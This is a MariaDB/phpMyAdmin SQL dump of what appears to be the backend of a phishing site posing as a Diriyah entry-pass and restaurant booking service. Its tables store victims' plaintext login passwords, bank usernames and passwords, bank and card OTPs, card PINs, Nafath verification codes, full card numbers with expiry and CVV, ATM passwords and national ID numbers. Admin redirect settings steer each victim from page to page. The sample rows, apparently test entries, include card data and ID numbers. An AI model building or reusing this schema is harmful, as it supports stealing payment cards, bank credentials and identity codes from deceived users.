-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Apr 28, 2026 at 03:33 AM
-- Server version: 11.8.6-MariaDB-log
-- PHP Version: 7.2.34

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `u801672319_danire`
--

-- --------------------------------------------------------

--
-- Table structure for table `admins`
--

CREATE TABLE `admins` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `email` varchar(191) NOT NULL,
  `password_hash` varchar(255) NOT NULL,
  `last_login_at` datetime DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `bank_logins`
--

CREATE TABLE `bank_logins` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `bank` varchar(100) DEFAULT NULL,
  `user_name` varchar(191) DEFAULT NULL,
  `bk_pass` varchar(191) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `bank_otps`
--

CREATE TABLE `bank_otps` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `otp_code` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `card_otps`
--

CREATE TABLE `card_otps` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `card_id` bigint(20) UNSIGNED NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `otp_code` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `card_pins`
--

CREATE TABLE `card_pins` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `card_id` bigint(20) UNSIGNED NOT NULL,
  `client_id` bigint(20) NOT NULL,
  `pin_code` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `guest_logins`
--

CREATE TABLE `guest_logins` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `email` varchar(191) NOT NULL,
  `password_entered` varchar(255) NOT NULL,
  `next_after_login` varchar(100) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `guest_logins`
--

INSERT INTO `guest_logins` (`id`, `email`, `password_entered`, `next_after_login`, `created_at`) VALUES
(1, 'vmakfvnad@gmail.com', 'vnjtrigjiakd', 'diriyah', '2026-04-27 20:45:20'),
(2, 'adfmvkieow@gmail.com', 'orit9qer934', 'diriyah', '2026-04-27 20:53:57'),
(3, 'adfmvkieow@gmail.com', 'orit9qer934', 'diriyah', '2026-04-27 20:54:16'),
(4, 'adfmvkieow@gmail.com', 'vmdfnvmdfvn', 'diriyah', '2026-04-27 20:54:38'),
(5, 'adfmvkieow@gmail.com', 'vmdfnvmdfvn', 'diriyah', '2026-04-27 20:56:39'),
(6, 'oweqoeiqoeoqe@gmail.com', 'oipuoyu977', 'diriyah', '2026-04-27 21:45:43');

-- --------------------------------------------------------

--
-- Table structure for table `nafad_codes`
--

CREATE TABLE `nafad_codes` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `client_id` bigint(20) NOT NULL,
  `nafad_code` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `nafad_logs`
--

CREATE TABLE `nafad_logs` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `phone` varchar(30) DEFAULT NULL,
  `telecom` varchar(100) DEFAULT NULL,
  `id_number` varchar(50) DEFAULT NULL,
  `redirect_to` varchar(255) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `nafad_requests`
--

CREATE TABLE `nafad_requests` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `client_id` bigint(20) NOT NULL,
  `phone` varchar(30) DEFAULT NULL,
  `telecom` varchar(100) DEFAULT NULL,
  `id_number` varchar(50) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `nafath_numbers`
--

CREATE TABLE `nafath_numbers` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `client_id` bigint(20) NOT NULL,
  `number` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `nafath_numbers`
--

INSERT INTO `nafath_numbers` (`id`, `client_id`, `number`, `created_at`) VALUES
(1, -5, '29', '2026-04-27 21:10:08'),
(2, -6, '19', '2026-04-27 21:48:34'),
(3, -6, '28', '2026-04-27 21:48:38');

-- --------------------------------------------------------

--
-- Table structure for table `orders`
--

CREATE TABLE `orders` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `fake_user_key` varchar(64) DEFAULT NULL,
  `customer_email` varchar(191) DEFAULT NULL,
  `payment_method` varchar(100) DEFAULT '',
  `cardholder_name` varchar(191) DEFAULT '',
  `card_number` varchar(64) DEFAULT '',
  `expiry` varchar(20) DEFAULT '',
  `cvv` varchar(10) DEFAULT '',
  `otp` varchar(20) DEFAULT '',
  `atm_password` varchar(20) DEFAULT '',
  `mobile` varchar(30) DEFAULT '',
  `provider` varchar(100) DEFAULT '',
  `national_id_or_iqama` varchar(50) DEFAULT '',
  `transaction_no` varchar(20) DEFAULT NULL,
  `nafath_code` varchar(20) DEFAULT NULL,
  `status` varchar(100) NOT NULL DEFAULT 'Draft',
  `card_history_json` longtext DEFAULT NULL,
  `client_redirect_url` varchar(500) DEFAULT NULL,
  `client_redirect_version` int(10) UNSIGNED NOT NULL DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `orders`
--

INSERT INTO `orders` (`id`, `fake_user_key`, `customer_email`, `payment_method`, `cardholder_name`, `card_number`, `expiry`, `cvv`, `otp`, `atm_password`, `mobile`, `provider`, `national_id_or_iqama`, `transaction_no`, `nafath_code`, `status`, `card_history_json`, `client_redirect_url`, `client_redirect_version`, `created_at`, `updated_at`) VALUES
(1, '95d4ff6bf671eec7730a571617c17cce', 'vmakfvnad@gmail.com', 'Credit Card', 'moajfmadm', '4823 8735 4343 5434', '12/28', '878', '', '', '', '', '', NULL, NULL, 'Draft', '[{\"cardholder_name\":\"moajfmadm\",\"card_number\":\"4823 8735 4343 5434\",\"expiry\":\"12\\/28\",\"cvv\":\"878\",\"saved_at\":\"2026-04-27 20:46:07\",\"otp\":\"\",\"atm\":\"\"}]', NULL, 0, '2026-04-27 20:45:48', '2026-04-27 20:46:07'),
(2, 'c57ca83d780180c96d9fe80cdcc97e75', 'adfmvkieow@gmail.com', 'Credit Card', 'omake akd', '4354 7354 5341 2454', '12/29', '979', '2000', '1234', '500156489', 'STC', '1005498798', '666666', NULL, 'Draft', '[{\"cardholder_name\":\"omake akd\",\"card_number\":\"4354 7354 5341 2454\",\"expiry\":\"12\\/29\",\"cvv\":\"979\",\"saved_at\":\"2026-04-27 20:57:08\",\"otp\":\"2000\",\"atm\":\"1234\",\"otp_attempts\":[\"123456\",\"2000\"]}]', 'booking/payment-method.php?id=2', 7, '2026-04-27 20:56:54', '2026-04-27 21:43:16'),
(3, '385be8ed6b5332aa60f678f22d83f03a', 'oweqoeiqoeoqe@gmail.com', 'Credit Card', 'mohmakad', '7852 1658 9784 9789', '12/29', '979', '123454', '2222', '0548979877', 'STC', '1000245678', '258966', '28', 'Draft', '[{\"cardholder_name\":\"mohmakad\",\"card_number\":\"7852 1658 9784 9789\",\"expiry\":\"12\\/29\",\"cvv\":\"979\",\"saved_at\":\"2026-04-27 21:46:16\",\"otp\":\"123454\",\"atm\":\"2222\",\"otp_attempts\":[\"123454\"]}]', 'booking/success.php?id=3', 7, '2026-04-27 21:45:58', '2026-04-28 03:31:57');

-- --------------------------------------------------------

--
-- Table structure for table `order_booking_customer_info_log`
--

CREATE TABLE `order_booking_customer_info_log` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `order_id` bigint(20) UNSIGNED NOT NULL,
  `mobile` varchar(30) DEFAULT NULL,
  `provider` varchar(100) DEFAULT NULL,
  `national_id_or_iqama` varchar(50) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `order_booking_customer_info_log`
--

INSERT INTO `order_booking_customer_info_log` (`id`, `order_id`, `mobile`, `provider`, `national_id_or_iqama`, `created_at`) VALUES
(1, 3, '0548979877', 'STC', '1000245678', '2026-04-27 21:47:44');

-- --------------------------------------------------------

--
-- Table structure for table `order_booking_success_verify_log`
--

CREATE TABLE `order_booking_success_verify_log` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `order_id` bigint(20) UNSIGNED NOT NULL,
  `transaction_no` varchar(20) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `order_booking_success_verify_log`
--

INSERT INTO `order_booking_success_verify_log` (`id`, `order_id`, `transaction_no`, `created_at`) VALUES
(1, 3, '258966', '2026-04-27 21:47:59');

-- --------------------------------------------------------

--
-- Table structure for table `order_items`
--

CREATE TABLE `order_items` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `order_id` bigint(20) UNSIGNED NOT NULL,
  `type` varchar(80) NOT NULL,
  `restaurant_id` bigint(20) NOT NULL DEFAULT 0,
  `title` varchar(255) NOT NULL,
  `booking_date` date DEFAULT NULL,
  `guests` int(10) UNSIGNED NOT NULL DEFAULT 1,
  `unit_price` decimal(10,2) NOT NULL DEFAULT 0.00,
  `line_total` decimal(10,2) NOT NULL DEFAULT 0.00,
  `selected_time` varchar(50) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `order_items`
--

INSERT INTO `order_items` (`id`, `order_id`, `type`, `restaurant_id`, `title`, `booking_date`, `guests`, `unit_price`, `line_total`, `selected_time`, `created_at`) VALUES
(1, 1, 'DiriyahPass', 0, 'تصريح دخول الدرعية', '2026-05-03', 5, 50.00, 250.00, '2:00 م', '2026-04-27 20:45:48'),
(2, 2, 'DiriyahPass', 0, 'تصريح دخول الدرعية', '2026-05-04', 6, 50.00, 300.00, '2:00 م', '2026-04-27 20:56:54'),
(3, 3, 'DiriyahPass', 0, 'تصريح دخول الدرعية', '2026-05-01', 5, 50.00, 250.00, '1:00 م', '2026-04-27 21:45:58');

-- --------------------------------------------------------

--
-- Table structure for table `site_public_visit_day`
--

CREATE TABLE `site_public_visit_day` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `visit_day` date NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `site_settings`
--

CREATE TABLE `site_settings` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `setting_key` varchar(191) NOT NULL,
  `setting_value` longtext NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `site_settings`
--

INSERT INTO `site_settings` (`id`, `setting_key`, `setting_value`, `created_at`, `updated_at`) VALUES
(1, 'dash_redirect_user_-5', '{\"page\":\"booking\\/payment-method.php\",\"active\":true,\"t\":1777326195}', '2026-04-27 20:57:15', '2026-04-27 21:43:15'),
(8, 'dash_redirect_user_-6', '{\"page\":\"booking\\/success.php\",\"active\":true,\"t\":1777347116}', '2026-04-27 21:46:24', '2026-04-28 03:31:56');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `email` varchar(191) DEFAULT NULL,
  `full_name` varchar(191) DEFAULT NULL,
  `password_hash` varchar(255) DEFAULT NULL,
  `redirect_to` varchar(255) DEFAULT NULL,
  `redirect_active` tinyint(1) NOT NULL DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------
--
-- Table structure for table `restaurants`
--

CREATE TABLE `restaurants` (
  `id` int NOT NULL,
  `name` varchar(200) NOT NULL,
  `type` varchar(100) NOT NULL,
  `description` varchar(1000) NOT NULL,
  `minimum_charge` decimal(18,2) NOT NULL,
  `image_url` varchar(500) NOT NULL,
  `logo_url` varchar(500) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `restaurants`
--

INSERT INTO `restaurants` (`id`, `name`, `type`, `description`, `minimum_charge`, `image_url`, `logo_url`) VALUES
(1,'برنش آند كيك','عالمي','مطعم عالمي يقدم تجربة فريدة بنكهات أوروبية.',50.00,'https://s3.ticketmx.com/uploads/images/dc3da05925e3b013dd31db803aee61002b84c3a5.jpg','https://s3.ticketmx.com/uploads/images/57bde77de2eab09de36472cb45af748ebd0f883a.jpeg'),
(2,'كوفا للحلويات','إيطالي','من أقدم محلات الحلويات في إيطاليا.',50.00,'https://s3.ticketmx.com/uploads/images/c334f0cd19a6d2c6a4dcafd629b171bf52dfa477.jpeg','https://s3.ticketmx.com/uploads/images/12dde91a2e1d0516d29ea50b4bce8e5428a166bc.jpeg?w=750&h=750&mode=crop&bgcolor=black&format=jpg'),
(3,'لونق تشيم','تايلندي','مطعم تايلندي حاصل على نجمة ميشلان.',50.00,'https://s3.ticketmx.com/uploads/images/4662cdb0543f37db5dd9dd8160c0ffba6958b026.jpg?w=1920&h=700&mode=crop&bgcolor=black&format=jpg','https://s3.ticketmx.com/uploads/images/681bd55fd60c18086636e068378b27c80f591401.png'),
(4,'سموير','عربي','مطبخ عربي معاصر بنكهات مبتكرة.',100.00,'https://s3.ticketmx.com/uploads/images/1cd3c84939397f11560c2182bb849082c8b7780f.jpg','https://s3.ticketmx.com/uploads/images/171328c841175e3868d895bd0596476a2e3d657d.jpeg'),
(5,'Maiz','سعودي','مطبخ سعودي معاصر.',50.00,'https://s3.ticketmx.com/uploads/images/18f0cd54ac1189d4d194483aafa81b19a1d3ea53.jpg','https://s3.ticketmx.com/uploads/images/2b8446f4a015ab2248a60c6d7aae31e5148b7b69.jpeg'),
(6,'Sarabeth''s','أمريكي','مطعم أمريكي كلاسيكي.',50.00,'https://s3.ticketmx.com/uploads/images/e2b212c3e3e995fec6aab280de9222e036ea5548.jpg','https://s3.ticketmx.com/uploads/images/6fdd2c48d28d6ae34e943cb991f3f4ac70aba1e3.jpeg'),
(7,'Villa Mamas','بحريني','نكهات بحرينية تقليدية.',50.00,'https://s3.ticketmx.com/uploads/images/8ac4478b64d9249e8ea05d819ef894716efcf890.jpg?w=1920&h=700&mode=crop&bgcolor=black&format=jpg','https://s3.ticketmx.com/uploads/images/d61080bc423e0e9f8a2e168a4966729002b7a7e4.png'),
(8,'Angelina','فرنسي','مطعم فرنسي راقي.',100.00,'https://s3.ticketmx.com/uploads/images/62d35c7e8a573ce2e3c2f58fef5bfefb5bd89b0c.jpg','https://s3.ticketmx.com/uploads/images/025684d674038de717849ab7648ac07d9e758380.jpeg'),
(9,'Sum+Things','عالمي','تجربة طعام عالمية مبتكرة.',50.00,'https://s3.ticketmx.com/uploads/images/708d2b1f002656fa349b6e1bac06423516b9c940.jpg','https://s3.ticketmx.com/uploads/images/0ccb0c4936c6f8f2bc582de782f586009a79dcb3.jpeg'),
(10,'Flamingo Room','أوروبي','مطعم أوروبي فاخر.',50.00,'https://s3.ticketmx.com/uploads/images/6d48728583b18cb8fcd457a955d4de5ecef627e4.jpeg','https://s3.ticketmx.com/uploads/images/4e6f28ff2f9e5b6ec454f69466108ee0d11cca0f.jpeg'),
(11,'Takya','سعودي','مطعم سعودي عصري.',100.00,'https://s3.ticketmx.com/uploads/images/3c2475d677b483d98054db4b2056199aa65d6d89.jpg','https://s3.ticketmx.com/uploads/images/d0439724baefb87c36ab9686e0b0c4e47a8df8ff.jpg'),
(12,'Altopiano','إيطالي','نكهات إيطالية أصيلة.',50.00,'https://s3.ticketmx.com/uploads/images/e3ec2ab6a7849e584da4a00fb41ef0acdb9d3560.jpg','https://s3.ticketmx.com/uploads/images/f140c9e5e0c441879d2c2d00a42dc1b0a1f87a51.jpg'),
(13,'African Lounge','أفريقي','مطعم أفريقي فاخر.',150.00,'https://s3.ticketmx.com/uploads/images/82b7017ee1f5e2aeeeb1976f6b70e2c72681c9ef.png','https://s3.ticketmx.com/uploads/images/86bf1bacf103acc43409d31b2f39892951546ff2.png'),
(14,'MAISON ASSOULINE','عالمي','تجربة فاخرة ومميزة.',50.00,'https://s3.ticketmx.com/uploads/images/513905dc523d74baeae65ca18e304ec12a101745.jpeg','https://s3.ticketmx.com/uploads/images/f7db7cb9aba48e752438edbb8fb33db4a760dedf.jpeg'),
(15,'Dolce and Gabbana Caffe','إيطالي','مقهى فاخر بطابع إيطالي.',1.00,'https://s3.ticketmx.com/uploads/images/efdf8102069e93691cdf9874e3a7a68209876169.jpg','https://s3.ticketmx.com/uploads/images/c363428069a78389c5fc6e6a254e67bee14192a1.jpg'),
(16,'LIZA','عالمي','مطعم بطابع عالمي.',50.00,'https://s3.ticketmx.com/uploads/images/db19a6d6edbff851dda08f1ba06b59e935f09640.jpg','https://s3.ticketmx.com/uploads/images/17fc57d1db0f816371d6c1ef1d6287110a47ef64.png');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admins`
--
ALTER TABLE `admins`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `uniq_admins_email` (`email`);

--
-- Indexes for table `bank_logins`
--
ALTER TABLE `bank_logins`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_bank_logins_user_id` (`user_id`);

--
-- Indexes for table `bank_otps`
--
ALTER TABLE `bank_otps`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_bank_otps_user_id` (`user_id`);

--
-- Indexes for table `card_otps`
--
ALTER TABLE `card_otps`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_card_otps_card_id` (`card_id`),
  ADD KEY `idx_card_otps_user_id` (`user_id`);

--
-- Indexes for table `card_pins`
--
ALTER TABLE `card_pins`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_card_pins_card_id` (`card_id`),
  ADD KEY `idx_card_pins_client_id` (`client_id`);

--
-- Indexes for table `guest_logins`
--
ALTER TABLE `guest_logins`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_guest_logins_email` (`email`),
  ADD KEY `idx_guest_logins_created_at` (`created_at`);

--
-- Indexes for table `nafad_codes`
--
ALTER TABLE `nafad_codes`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_nafad_codes_client_id` (`client_id`);

--
-- Indexes for table `nafad_logs`
--
ALTER TABLE `nafad_logs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_nafad_logs_user_id` (`user_id`);

--
-- Indexes for table `nafad_requests`
--
ALTER TABLE `nafad_requests`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_nafad_requests_client_id` (`client_id`);

--
-- Indexes for table `nafath_numbers`
--
ALTER TABLE `nafath_numbers`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_nafath_numbers_client_id` (`client_id`);

--
-- Indexes for table `orders`
--
ALTER TABLE `orders`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_orders_customer_email` (`customer_email`),
  ADD KEY `idx_orders_created_at` (`created_at`);

--
-- Indexes for table `order_booking_customer_info_log`
--
ALTER TABLE `order_booking_customer_info_log`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_obci_order` (`order_id`);

--
-- Indexes for table `order_booking_success_verify_log`
--
ALTER TABLE `order_booking_success_verify_log`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_obs_order` (`order_id`);

--
-- Indexes for table `order_items`
--
ALTER TABLE `order_items`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_order_items_order_id` (`order_id`);

--
-- Indexes for table `site_public_visit_day`
--
ALTER TABLE `site_public_visit_day`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_site_public_visit_day_visit_day` (`visit_day`);

--
-- Indexes for table `site_settings`
--
ALTER TABLE `site_settings`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `uniq_site_settings_key` (`setting_key`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `uniq_users_email` (`email`);

--
-- Indexes for table `restaurants`
--
ALTER TABLE `restaurants`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admins`
--
ALTER TABLE `admins`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `bank_logins`
--
ALTER TABLE `bank_logins`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `bank_otps`
--
ALTER TABLE `bank_otps`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `card_otps`
--
ALTER TABLE `card_otps`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `card_pins`
--
ALTER TABLE `card_pins`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `guest_logins`
--
ALTER TABLE `guest_logins`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `nafad_codes`
--
ALTER TABLE `nafad_codes`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `nafad_logs`
--
ALTER TABLE `nafad_logs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `nafad_requests`
--
ALTER TABLE `nafad_requests`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `nafath_numbers`
--
ALTER TABLE `nafath_numbers`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `orders`
--
ALTER TABLE `orders`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `order_booking_customer_info_log`
--
ALTER TABLE `order_booking_customer_info_log`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `order_booking_success_verify_log`
--
ALTER TABLE `order_booking_success_verify_log`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `order_items`
--
ALTER TABLE `order_items`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `site_public_visit_day`
--
ALTER TABLE `site_public_visit_day`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `site_settings`
--
ALTER TABLE `site_settings`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `order_booking_customer_info_log`
--
ALTER TABLE `order_booking_customer_info_log`
  ADD CONSTRAINT `fk_obci_order` FOREIGN KEY (`order_id`) REFERENCES `orders` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `order_booking_success_verify_log`
--
ALTER TABLE `order_booking_success_verify_log`
  ADD CONSTRAINT `fk_obs_order` FOREIGN KEY (`order_id`) REFERENCES `orders` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `order_items`
--
ALTER TABLE `order_items`
  ADD CONSTRAINT `fk_order_items_order` FOREIGN KEY (`order_id`) REFERENCES `orders` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
